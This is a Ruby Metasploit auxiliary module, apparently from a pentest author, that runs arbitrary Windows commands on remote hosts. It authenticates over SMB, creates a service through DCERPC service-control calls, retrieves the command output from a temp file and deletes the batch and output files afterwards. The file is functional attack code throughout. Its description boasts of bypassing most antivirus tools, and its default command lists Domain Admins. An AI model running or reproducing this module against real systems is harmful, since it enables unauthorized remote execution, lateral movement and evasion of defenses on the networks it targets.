#!/usr/bin/env ruby

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	# Exploit mixins should be called first
	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::Remote::SMB::Authenticated
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner
	include Msf::Exploit::Remote::DCERPC

	# Aliases for common classes
	SIMPLE = Rex::Proto::SMB::SimpleClient
	XCEPT  = Rex::Proto::SMB::Exceptions
	CONST  = Rex::Proto::SMB::Constants

	def initialize(info = {})
		super(update_info(info,
         	'Name'           => 'SMB - Execute Windows Command',
         	'Description'    => %q{This module executes a *single* windows command on one or more hosts
         		by authenticating over SMB and passing a dcerpc request.  Daisy chaining commands wiht '&'
         		does not work and you shouldn't try it.  It steals code from the psexec 
         		module so thanks very much to the author/s of that great tool.  This module is useful 
         		because it does not need to upload any binaries to the target machine and therefore 
         		should bypass most if not all Antivirus solutions
	         },

	         'Author'         => [
	         	'Royce Davis <rdavis[at]accuvant.com>',
	         	'Twitter: <[at]R3dy__>',
	         ],
 
	         'License'        => MSF_LICENSE,
	         'References'     => [
	         	[ 'URL', 'http://www.pentestgeek.com' ],
	         	[ 'URL', 'http://www.accuvant.com' ],
	         	[ 'URL', 'http://sourceforge.net/projects/smbexec/' ],
	         ],
	    ))

		register_options([
			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
			OptString.new('COMMAND', [true, 'The command you want to execute on the remote host', 'net group "Domain Admins" /domain']),
			OptString.new('RPORT', [true, 'The Target port', 445]),
		], self.class)

		deregister_options('RHOST')			
	end
	
	
	
	#-----------------------------------
	# This is the main controle method
	#-----------------------------------
	def run_host(ip)
		cmd = "C:\\WINDOWS\\SYSTEM32\\cmd.exe"
		text = "\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
		bat = "C:\\WINDOWS\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
		
		#Try and Connect to the target
		begin
			connect()
		rescue StandardError => connecterror
			print_error("Unable to connect to the target: #{connecterror}")
			return
		end
		
		#Try and authenticate with given credentials
		begin
			smb_login()
		rescue StandardError => autherror
			print_error("Unable to authenticate with given credentials: #{autherror}")
			return
		end
		
		smbshare = datastore['SMBSHARE']	
		begin 
			execute_command(smbshare, ip, cmd, text, bat)
			get_output(smbshare, ip, text)
			cleanup_after(smbshare, ip, cmd, text, bat)
		rescue 
			# Something went terribly wrong
			return
		end	
	end
	
	
	
	#------------------------------------
	# Executes specified Windows Command
	#------------------------------------
	def execute_command(smbshare, ip, cmd, text, bat)
		begin
			#Try and execute the provided command
			execute = "#{cmd} /C echo #{datastore['COMMAND']} ^> C:#{text} > #{bat} & #{cmd} /C start cmd.exe /C #{bat}"
			simple.connect(smbshare)
			print_status("Executing your command on host: #{ip}")
			psexec(smbshare, execute)
		rescue StandardError => execerror
			print_error("Unable to execute specified command: #{execerror}")
			return execerror
		end
	end
	
	
	
	# -----------------------------	
	# Retrive output from command
	#-----------------------------
	def get_output(smbshare, ip, file)
		begin
			simple.connect("\\\\#{ip}\\#{smbshare}")
			outfile = simple.open(file, 'ro')
			output = outfile.read 
			outfile.close
			simple.disconnect("\\\\#{ip}\\#{smbshare}")
			if output.empty?
				print_status("Command finished with no output")
				return
			end
			print_good("Command completed successfuly! Output from: #{ip}\r\n#{output}")
		rescue StandardError => output_error
			print_error("#{ip} - Error getting command output. #{output_error.class}. #{output_error}.")
			return
		end
	end
	


	#----------------------------------------------------------------------------------
	# This is the cleanup method, removes .txt and .bat file/s created during execution-
	#-----------------------------------------------------------------------------------
	def cleanup_after(smbshare, ip, cmd, text, bat)
		begin
			# Try and do cleanup command
			cleanup = "#{cmd} /C del C:#{text} & del #{bat}"
			simple.connect(smbshare)
			print_status("Executing cleanup on host: #{ip}")
			psexec(smbshare, cleanup)
		rescue StandardError => cleanuperror
			print_error("Unable to processes cleanup commands: #{cleanuperror}")
			return cleanuperror
		end
	end
	
	
	
	#------------------------------------------------------------------------------------------------------------------------
	# This code was stolen straight out of psexec.rb.  Thanks very much for all who contributed to that module!!
	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
	#------------------------------------------------------------------------------------------------------------------------
	def psexec(smbshare, command)
		filename = "filename"
		servicename = "servicename"
		simple.disconnect(smbshare)

		simple.connect("IPC$")

		handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"])
		vprint_status("Binding to #{handle} ...")
		dcerpc_bind(handle)
		vprint_status("Bound to #{handle} ...")

		vprint_status("Obtaining a service manager handle...")
		scm_handle = nil
		stubdata =
			NDR.uwstring("\\\\#{rhost}") +
			NDR.long(0) +
			NDR.long(0xF003F)
		begin
			response = dcerpc.call(0x0f, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				scm_handle = dcerpc.last_response.stub_data[0,20]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		displayname = "displayname"
		holdhandle = scm_handle
		svc_handle  = nil
		svc_status  = nil

		stubdata =
			scm_handle +
			NDR.wstring(servicename) +
			NDR.uwstring(displayname) +

			NDR.long(0x0F01FF) + # Access: MAX
			NDR.long(0x00000110) + # Type: Interactive, Own process
			NDR.long(0x00000003) + # Start: Demand
			NDR.long(0x00000000) + # Errors: Ignore
			NDR.wstring( command ) +
			NDR.long(0) + # LoadOrderGroup
			NDR.long(0) + # Dependencies
			NDR.long(0) + # Service Start
			NDR.long(0) + # Password
			NDR.long(0) + # Password
			NDR.long(0) + # Password
			NDR.long(0)  # Password
		begin
			vprint_status("Attempting to execute #{command}")
			response = dcerpc.call(0x0c, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				svc_handle = dcerpc.last_response.stub_data[0,20]
				svc_status = dcerpc.last_response.stub_data[24,4]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		vprint_status("Closing service handle...")
		begin
			response = dcerpc.call(0x0, svc_handle)
		rescue ::Exception
		end

		vprint_status("Opening service...")
		begin
			stubdata =
				scm_handle +
				NDR.wstring(servicename) +
				NDR.long(0xF01FF)

			response = dcerpc.call(0x10, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				svc_handle = dcerpc.last_response.stub_data[0,20]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		vprint_status("Starting the service...")
		stubdata =
			svc_handle +
			NDR.long(0) +
			NDR.long(0)
		begin
			response = dcerpc.call(0x13, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		vprint_status("Removing the service...")
		stubdata =
			svc_handle +
			NDR.wstring("C:\\WINDOWS\\Temp\\msfcommandoutput.txt")
		begin
			response = dcerpc.call(0x02, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
		end

		vprint_status("Closing service handle...")
		begin
			response = dcerpc.call(0x0, svc_handle)
		rescue ::Exception => e
			print_error("Error: #{e}")
		end
			
		begin
			#print_status("Deleting \\#{filename}...")
			select(nil, nil, nil, 1.0)
			#This is not really useful but will prevent double \\ on the wire :)
		if datastore['SHARE'] =~ /.[\\\/]/
			simple.connect(smbshare)
			simple.delete("C:\\WINDOWS\\Temp\\msfcommandoutput.txt")
		else
			simple.connect(smbshare)
			simple.delete("C:\\WINDOWS\\Temp\\msfcommandoutput.txt")
		end

		rescue ::Interrupt
			raise $!
		rescue ::Exception
			#raise $!
		end
		simple.disconnect("IPC$")
		simple.disconnect(smbshare)
	end
	
end
